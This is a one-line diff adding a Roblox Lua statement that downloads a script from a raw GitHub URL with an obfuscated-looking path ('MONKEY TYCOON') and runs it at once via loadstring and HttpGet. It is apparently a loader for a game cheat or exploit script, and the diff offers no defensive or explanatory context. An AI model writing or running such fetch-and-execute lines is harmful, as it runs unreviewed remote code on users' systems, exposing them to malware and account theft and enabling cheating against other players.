@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/9ur98wh8fjkerbngo12ikontgg/fortnite/main/MONKEY%20TYCOON%20ufur9eih%20u8u%20irgheg%20ruihgruei%20hgurihrguiehrguihiujbgujihggerhiouergui", true))()
